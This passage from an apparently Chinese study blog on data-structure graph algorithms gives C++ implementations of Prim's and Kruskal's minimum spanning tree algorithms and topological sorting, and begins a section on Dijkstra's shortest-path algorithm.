class="line">&#125;ArcCell,G[MAX_VERTEX_NUM][MAX_VERTEX_NUM];</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span>&#123;</span><br><span class="line">    <span class="type">char</span> begin;</span><br><span class="line">    <span class="type">char</span> end;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    G arcs;</span><br><span class="line">    <span class="type">int</span> vexnum,arcsnum;</span><br><span class="line">    <span class="type">char</span> vex[MAX_VERTEX_NUM];</span><br><span class="line">    Edge edge[MAX_VERTEX_NUM];</span><br><span class="line">&#125;MGraph;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">V</span>&#123;</span><br><span class="line">    <span class="type">int</span> adjvex;<span class="comment">//closedeg[i].adjvex记录的是，顶点i到U中最短边的点</span></span><br><span class="line">    <span class="type">float</span> lowcost;<span class="comment">//lowcost记录权值</span></span><br><span class="line">&#125;;</span><br><span class="line">V closedge[MAX_VERTEX_NUM];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Locatevex</span><span class="params">(MGraph G,<span class="type">char</span> u)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(G.vex[i]==u)&#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateGraph</span><span class="params">(MGraph &amp;G)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    <span class="type">char</span> name;</span><br><span class="line">    <span class="type">float</span> w;</span><br><span class="line">    <span class="type">char</span> ii, jj;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;G.vexnum,&amp;G.arcsnum);<span class="comment">//输入顶点数和弧数</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">       <span class="comment">// cout&lt;&lt;&quot;input name:&quot;;</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;name);  <span class="comment">//输入顶点名称，按次存储在vex[]数组中，下标从0开始</span></span><br><span class="line">        G.vex[i]=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;</span><br><span class="line">            G.arcs[i][j].adj=<span class="number">100</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.arcsnum;i++)&#123;</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c %c %f&quot;</span>,&amp;ii,&amp;jj,&amp;w);</span><br><span class="line">        j=<span class="built_in">Locatevex</span>(G, ii);</span><br><span class="line">        k=<span class="built_in">Locatevex</span>(G, jj);</span><br><span class="line">        G.arcs[j][k].adj=w;</span><br><span class="line">        G.arcs[k][j].adj=w;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">showMatrix</span><span class="params">(MGraph G)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;</span><br><span class="line">            cout&lt;&lt;G.arcs[i][j].adj&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MiniSpanTree_P</span><span class="params">(MGraph G,<span class="type">char</span> u)</span></span>&#123;</span><br><span class="line">   <span class="comment">// getchar();</span></span><br><span class="line">    V closedge[G.vexnum];</span><br><span class="line">    <span class="type">int</span> t=<span class="built_in">Locatevex</span>(G,u);</span><br><span class="line">    <span class="type">int</span> i,j,k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(j!=t)&#123;</span><br><span class="line">            closedge[j]=&#123;t,G.arcs[t][j].adj&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        closedge[t].lowcost=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        <span class="comment">/*for(int c=0;c&lt;G.vexnum;c++)&#123;</span></span><br><span class="line"><span class="comment">            cout&lt;&lt;closedge[c].adjvex&lt;&lt;&quot; &quot;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        cout&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">        for(int c=0;c&lt;G.vexnum;c++)&#123;</span></span><br><span class="line"><span class="comment">            cout&lt;&lt;closedge[c].lowcost&lt;&lt;&quot; &quot;;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        cout&lt;&lt;endl;*/</span></span><br><span class="line">        <span class="type">float</span> temp=<span class="number">100</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;            <span class="comment">//求k closedge最小值</span></span><br><span class="line">            <span class="keyword">if</span>(closedge[j].lowcost==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(closedge[j].lowcost&lt;temp)&#123;</span><br><span class="line">                    k=j;</span><br><span class="line">                    temp=closedge[j].lowcost;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="comment">// cout&lt;&lt;k&lt;&lt;endl;</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,G.vex[closedge[k].adjvex]);</span><br><span class="line">        <span class="keyword">if</span>(i==G.vexnum<span class="number">-1</span>)&#123;</span><br><span class="line">            cout&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;-&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        closedge[k].lowcost=<span class="number">0</span>;</span><br><span class="line">        t=k;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;G.vexnum;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!closedge[j].lowcost)&#123;</span><br><span class="line">                closedge[j].adjvex=t;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                closedge[j].adjvex=t;</span><br><span class="line">                closedge[j].lowcost=G.arcs[t][j].adj;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    MGraph G;</span><br><span class="line">    <span class="built_in">CreateGraph</span>(G);</span><br><span class="line">    <span class="built_in">showMatrix</span>(G);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;===============&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="type">char</span> index;</span><br><span class="line">    cin&gt;&gt;index;</span><br><span class="line">    <span class="built_in">MiniSpanTree_P</span>(G, index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>kruskal算法</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    <span class="type">int</span> src, dest;</span><br><span class="line">    <span class="type">float</span> weight;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 寻找父节点</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">findParent</span><span class="params">(<span class="type">int</span> parent[], <span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (parent[i] == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">findParent</span>(parent, parent[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并两个子树</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unionSets</span><span class="params">(<span class="type">int</span> parent[], <span class="type">int</span> x, <span class="type">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> xset = <span class="built_in">findParent</span>(parent, x);</span><br><span class="line">    <span class="type">int</span> yset = <span class="built_in">findParent</span>(parent, y);</span><br><span class="line">    parent[xset] = yset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">kruskalMST</span><span class="params">(<span class="type">int</span> V, Edge edges[], <span class="type">int</span> E)</span> </span>&#123;</span><br><span class="line">    Edge result[V - <span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>; <span class="comment">// 用于结果数组的索引</span></span><br><span class="line">    <span class="type">int</span> e = <span class="number">0</span>; <span class="comment">// 用于排序边的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对边按权重进行排序</span></span><br><span class="line">    <span class="built_in">sort</span>(edges, edges + E, [](Edge a, Edge b) &#123;</span><br><span class="line">        <span class="keyword">return</span> a.weight &lt; b.weight;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> parent[V]; <span class="comment">// 用于检测环路</span></span><br><span class="line">    <span class="built_in">fill</span>(parent, parent + V, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (i &lt; V - <span class="number">1</span> &amp;&amp; e &lt; E) &#123;</span><br><span class="line">        Edge nextEdge = edges[e++];</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> x = <span class="built_in">findParent</span>(parent, nextEdge.src);</span><br><span class="line">        <span class="type">int</span> y = <span class="built_in">findParent</span>(parent, nextEdge.dest);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (x != y) &#123;</span><br><span class="line">            result[i++] = nextEdge;</span><br><span class="line">            <span class="built_in">unionSets</span>(parent, x, y);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出最小生成树的边和权重</span></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Edges in the Minimum Spanning Tree:&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; V - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        cout &lt;&lt; result[i].src &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; result[i].dest &lt;&lt; <span class="string">&quot; : &quot;</span> &lt;&lt; result[i].weight &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> V = <span class="number">4</span>; <span class="comment">// 顶点数</span></span><br><span class="line">    <span class="type">int</span> E = <span class="number">5</span>; <span class="comment">// 边数</span></span><br><span class="line">    Edge edges[] = &#123;</span><br><span class="line">        &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>&#125;,</span><br><span class="line">        &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>&#125;,</span><br><span class="line">        &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行Kruskal算法并输出结果</span></span><br><span class="line">    <span class="built_in">kruskalMST</span>(V, edges, E);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="有向无环图的应用"><a href="#有向无环图的应用" class="headerlink" title="有向无环图的应用"></a>有向无环图的应用</h3><p>有向无环图简称DAG图</p><p>DAG图在工程计划和管理方面应用广泛。</p><h4 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h4><h5 id="基本定义和特点"><a href="#基本定义和特点" class="headerlink" title="基本定义和特点"></a>基本定义和特点</h5><p>顶点活动网：AOV网，将顶点表示活动，边表示活动之间的关系</p><p>拓扑序列：把AOV网中的所有顶点排成可以线性序列，该序列满足：若AOV网中存在从$v_i$到$v_j$的路径，则在该序列中，$v_i$必位于$v_j$之前</p><p>拓扑排序：构造AOV网的拓扑序列的操作被称为拓扑排序</p><p>特点：</p><p>1.一个有向图的拓扑序列不一定唯一</p><p>2.有向无环图一定存在拓扑序列</p><p>3.有向有环图不存在拓扑序列</p><p>4.可以通过构造拓扑序列，判断AOV网是否存在环</p><h5 id="拓扑排序算法的基本思想"><a href="#拓扑排序算法的基本思想" class="headerlink" title="拓扑排序算法的基本思想"></a>拓扑排序算法的基本思想</h5><p>1.在有向图中选一个入度为0的顶点输出</p><p>2。从图中删除该顶点及所有它的出边</p><p>3.重复 1和2 直到所有顶点输出或者图中剩余顶点入度均不为0（此时图中有回路，无法拓扑排序）</p><h5 id="算法概要-2"><a href="#算法概要-2" class="headerlink" title="算法概要"></a>算法概要</h5><p>增加一个存放各顶点入度的数组indegree[]</p><p>1.扫描indegree[]，将入度为0的顶点入栈</p><p>2.while(栈非空){</p><p>​    出栈顶元素$v_i$，并输出；</p><p>​    检查$v_i$的出边表，将每条出边&lt;$v_i$,$v_j$&gt;的终点$v_j$的入度减1，若vj的入度减至0，v$v_j$入栈；</p><p>}</p><p>3.若输出的顶点数小于n则有回路（无法拓扑排序），否则正常结束。</p><p>算法实现：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACK_INIT_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STACKINCREMENT 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FALSE 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRUE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OK 1</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;DG,DN,UDG,UDN&#125;GraphKind;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">InfoType</span> &#123;</span><br><span class="line">    <span class="type">int</span> weight;</span><br><span class="line">&#125;InfoType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">vertextype</span>&#123;</span><br><span class="line">    <span class="type">char</span> id;</span><br><span class="line">    <span class="type">int</span> No;</span><br><span class="line"> <span class="comment">//   string label;</span></span><br><span class="line">&#125;vertextype;</span><br><span class="line"><span class="comment">//边表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ArcNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> adjvex; <span class="comment">//该弧指向的顶点位置</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">ArcNode</span> *nextarc;</span><br><span class="line">    InfoType *info;</span><br><span class="line">&#125;ArcNode;</span><br><span class="line"><span class="comment">//顶点表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">vnode</span>&#123;</span><br><span class="line">    vertextype data;</span><br><span class="line">    ArcNode *firstarc;</span><br><span class="line">&#125;vnode,adjlist[MAX_VERTEX_NUM];</span><br><span class="line"><span class="comment">//邻接表的存储结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    adjlist vertices;</span><br><span class="line">    <span class="type">int</span> vexnum,arcnum;</span><br><span class="line">    GraphKind kind;</span><br><span class="line">&#125;ALGraph;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Creatadilist</span><span class="params">(ALGraph &amp;G)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    ArcNode *s;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d,%d&quot;</span>,&amp;G.vexnum,&amp;G.arcnum,&amp;G.kind);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        cin&gt;&gt;G.vertices[i].data.id;</span><br><span class="line">        G.vertices[i].firstarc=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;G.arcnum;k++)&#123;</span><br><span class="line">        cin&gt;&gt;i&gt;&gt;j;</span><br><span class="line">        s=(ArcNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(ArcNode));</span><br><span class="line">        s-&gt;adjvex=j;</span><br><span class="line">        s-&gt;info=<span class="literal">NULL</span>;</span><br><span class="line">        s-&gt;nextarc=G.vertices[i].firstarc;</span><br><span class="line">        G.vertices[i].firstarc=s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SElemType</span>&#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">    <span class="type">int</span> *base;</span><br><span class="line">    <span class="type">int</span> *top;</span><br><span class="line">    <span class="type">int</span> stacksize;</span><br><span class="line">&#125;SqStack;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitStack</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    S.base=(<span class="type">int</span>*)<span class="built_in">malloc</span>(STACK_INIT_SIZE*<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">if</span>(!S.base) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    S.top=S.base;</span><br><span class="line">    S.stacksize=STACK_INIT_SIZE;</span><br><span class="line">  <span class="comment">//  cout&lt;&lt;&quot;Init succeed.&quot;&lt;&lt;endl;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(SqStack &amp;S,<span class="type">int</span> e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top-S.base&gt;=S.stacksize)&#123;</span><br><span class="line">        S.base=(<span class="type">int</span>*)<span class="built_in">realloc</span>(S.base, (S.stacksize+STACKINCREMENT)*<span class="built_in">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span>(!S.base) &#123;</span><br><span class="line">       <span class="comment">// cout&lt;&lt;&quot;ERROR&quot;&lt;&lt;endl;</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    S.top=S.base+S.stacksize;</span><br><span class="line">    S.stacksize+=STACKINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line">    *S.top++=e;</span><br><span class="line"> <span class="comment">//   cout&lt;&lt;&quot;Push succeed.&quot;&lt;&lt;endl;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Pop</span><span class="params">(SqStack &amp;S,<span class="type">int</span> &amp;e)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==S.base)&#123;</span><br><span class="line">     <span class="comment">//   cout&lt;&lt;&quot;Stack is Empty.&quot;&lt;&lt;endl;</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        e=*(S.top<span class="number">-1</span>);</span><br><span class="line">        S.top--;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;&quot;Pop succeed.&quot;&lt;&lt;endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Clear</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(S.top&gt;S.base)&#123;</span><br><span class="line">        <span class="type">int</span>* p=S.top;</span><br><span class="line">        S.top--;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        S.stacksize-=STACKINCREMENT;</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="comment">// cout&lt;&lt;&quot;Stack clear succeed.&quot;&lt;&lt;endl;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyStack</span><span class="params">(SqStack &amp;S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (S.base != <span class="literal">NULL</span> )&#123;</span><br><span class="line">        <span class="built_in">Clear</span>(S);</span><br><span class="line">        <span class="built_in">free</span>(S.base);</span><br><span class="line">        S.base = <span class="literal">NULL</span>;</span><br><span class="line">        S.top = <span class="literal">NULL</span>;</span><br><span class="line">        S.stacksize = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//cout &lt;&lt; &quot;Stack destroyed.&quot; &lt;&lt; endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackEmpty</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.base==S.top) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackLength</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(S.base==S.top)) <span class="keyword">return</span> S.top-S.base;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetTop</span><span class="params">(SqStack S,<span class="type">int</span> &amp;e)</span></span>&#123;</span><br><span class="line">    e=*(S.top<span class="number">-1</span>);</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;e is:&quot;</span>&lt;&lt;(&amp;e)&lt;&lt;<span class="string">&quot;-&quot;</span>&lt;&lt;(&amp;e)&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackTravers</span><span class="params">(SqStack S)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">StackEmpty</span>(S))</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Stack is Empty.&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!(S.top==S.base))&#123;</span><br><span class="line">        S.top--;</span><br><span class="line">        cout&lt;&lt;i&lt;&lt;<span class="string">&quot;. &quot;</span>;</span><br><span class="line">        cout&lt;&lt;(*(&amp;S.top))&lt;&lt;endl;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;(*(&amp;S.top))-&gt;b&lt;&lt;endl;</span></span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">FindInDegree</span><span class="params">(ALGraph G, <span class="type">int</span> indegree[])</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;ArcNode *p;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;i++)&#123;</span><br><span class="line">        p=G.vertices[i].firstarc;</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            indegree[p-&gt;adjvex]++;</span><br><span class="line">            p=p-&gt;nextarc;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">TopologicalSort</span><span class="params">(ALGraph G)</span></span>&#123;</span><br><span class="line">    SqStack S;</span><br><span class="line">    <span class="type">int</span> count,k,i;</span><br><span class="line">    ArcNode *p;</span><br><span class="line">    <span class="type">int</span> indegree[MAX_VERTEX_NUM]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">FindInDegree</span>(G, indegree);</span><br><span class="line">    <span class="built_in">InitStack</span>(S);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;G.vexnum;++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!indegree[i]) <span class="built_in">Push</span>(S, i);</span><br><span class="line">    &#125;</span><br><span class="line">    count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">StackEmpty</span>(S))&#123;</span><br><span class="line">        <span class="built_in">Pop</span>(S,i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>,i,G.vertices[i].data.No);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">for</span>(p=G.vertices[i].firstarc;p;p=p-&gt;nextarc)&#123;</span><br><span class="line">            k=p-&gt;adjvex;</span><br><span class="line">            <span class="keyword">if</span>(!(--indegree[k])) <span class="built_in">Push</span>(S, k);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(count&lt;G.vexnum)<span class="keyword">return</span> ERROR;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="最短路径"><a href="#最短路径" class="headerlink" title="最短路径"></a>最短路径</h3><h4 id="问题提出"><a href="#问题提出" class="headerlink" title="问题提出"></a>问题提出</h4><p>路径长度：路径上边的权值之和</p><p>最短路径：两结点间权值之和最小的路径</p><h4 id="单源最短路径Dijkstra"><a href="#单源最短路径Dijkstra" class="headerlink" title="单源最短路径Dijkstra"></a>单源最短路径Dijkstra</h4><p>给定有向图G和源点$v_i$，求$v_i$到G中其余各顶点的最短路径</p><h5 id="算法思想"><a href="#算法思想" class="headerlink" title="算法思想"></a>算法思想</h5><p>按路径长度的递增次序，逐步产生最短路径Dijkstra算法(SPF算法)</p><p>首先求出长度最短的一条路径，再参照它求出长度次短的一条最短路径，以此类推，直到从顶点v到其他各顶点的最短路径全部求出为止</p><h5 id="算法要点"><a href="#算法要点" class="headerlink" title="算法要点"></a>算法要点</h5><p>例图：<img src="/2023/11/21/单源最小路径示例.png" alt="单源最小路径"><br>1.设源点$v_0$，顶点集合分成两部分：</p><p>U：已经求出最短路径的顶点集合</p><p>V-U：未求出最短路径的顶点集合</p><p>初值：U={$v_0$},V-U={$v_1$,$v_2$,$v_3$,$v_4$}</p><p>第二个加入U中的顶点必然是与$v_0$邻接且与$v_0$之间的边长最短的顶点</p><p>2.U={$v_0$,$v_2$}，V-U={$v_1$,$v_3$,$v_4$}</p><p>设第三个加入U中的顶点是w$\in$V-U,则w到$v_0$的最短路径的特点是：w是V-U中满足$v_0$-&gt;w和$v_0$-&gt;$v_2$-&gt;w中最短的</p><h5 id="存储结构"><a href="#存储结构" class="headerlink" title="存储结构"></a>存储结构</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_VERTEX_NUM 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span 